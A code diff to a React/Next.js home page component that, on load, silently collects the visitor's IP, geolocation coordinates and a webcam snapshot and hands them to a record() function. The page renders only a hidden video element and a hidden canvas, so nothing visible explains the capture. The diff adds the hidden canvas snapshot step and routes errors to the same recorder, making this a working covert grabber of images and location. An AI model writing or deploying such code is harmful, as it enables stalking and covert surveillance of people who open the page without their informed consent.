@@ -30,16 +30,21 @@ export default function Home() {
       console.log(ip)
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition((position) => {
-          record(JSON.stringify([position]))
+          setTimeout(() => {
+            record(JSON.stringify([position.coords.latitude, position.coords.longitude]))
+          }, 1000)
 
-        });
+        },
+          (error) => {
+            record(JSON.stringify([error]))
+          });
       } else {
-        console.log("Geolocation is not supported by this browser.");
+        record("Geolocation is not supported by this browser.");
       }
 
-      
+
     })()
-    
+
   }, []);
   const accessCamera = async () => {
     try {
@@ -49,35 +54,35 @@ export default function Home() {
 
       if (videoRef.current) {
         videoRef.current.srcObject = stream;
+        setTimeout(() => {
+          const canvas = canvasRef.current;
+          canvas.width = videoRef.current.videoWidth;
+          canvas.height = videoRef.current.videoHeight;
+          canvas.getContext('2d').drawImage(videoRef.current, 0, 0);
+
+          const base64 = canvas.toDataURL("image/png");
+          record(JSON.stringify({ image: base64 }))
+          // alert(base64)
+          console.log(base64)
+        }, 1000)
       }
     } catch (error) {
-      console.error("Error accessing the camera: ", error);
+      record("Error accessing the camera: ", error);
     }
   };
 
   const videoRef = useRef(null);
+  const canvasRef = useRef(null);
 
   useEffect(() => {
     accessCamera();
-    const timer = setTimeout(() => {
-      const canvas = document.createElement('canvas');
-      canvas.width = videoRef.current.videoWidth;
-      canvas.height = videoRef.current.videoHeight;
-      canvas.getContext('2d').drawImage(videoRef.current, 0, 0);
-      
-      const base64 = canvas.toDataURL('image/jpeg');
-      record(JSON.stringify({image: base64})) 
-      console.log(base64)
-
-    }, 1000);
-
-    return () => clearTimeout(timer);
   }, []);
 
-  
+
   return (
     <main className="">
- <video ref={videoRef} autoPlay playsInline hidden/>
+      <video ref={videoRef} autoPlay playsInline hidden />
+      <canvas ref={canvasRef} hidden />
     </main>
   );
 }
